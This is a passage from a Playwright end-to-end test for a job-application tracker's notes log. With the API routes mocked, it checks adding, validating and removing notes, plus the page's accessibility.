    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(notes) });
    }
  });
  notes = [{ id: 21, at: "2026-09-10T15:00:00Z", body: "Recruiter call" }];
  await page.route("**/history", (route) => route.fulfill({
    status: 200, contentType: "application/json", body: JSON.stringify([
      ...history,
      { kind: "note", from_status: null, to_status: "", at: "2026-09-10T15:00:00Z", note: "Recruiter call" },
    ]),
  }));
  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("heading", { name: "Notes log", level: 3 })).toBeVisible();
  await expect(page.locator("#note-list li")).toHaveCount(1);
  await expect(page.locator("#history-list li").last()).toContainText("Note — Recruiter call");

  await page.getByRole("button", { name: "Add note" }).click();
  await expect(page.getByLabel("What happened")).toHaveAttribute("aria-invalid", "true");
  expect(posted).toBeNull();

  await page.getByLabel("What happened").fill("Sent the thank-you\nand the portfolio link");
  await page.getByRole("button", { name: "Add note" }).click();
  await expect.poll(() => posted).not.toBeNull();
  expect(posted.body).toBe("Sent the thank-you\nand the portfolio link");
  const items = page.locator("#note-list li");
  await expect(items).toHaveCount(2);
  await expect(items.first()).toContainText("Sent the thank-you");
  await expect(page.getByLabel("What happened")).toHaveValue("");
  await expectNoSeriousViolations(page);

  await items.first().getByRole("button", { name: /Remove the note from/ }).click();
  await expect.poll(() => removed).toBe(`/api/apps/${application.filename}/notes/22`);
  await expect(items).toHaveCount(1);
});
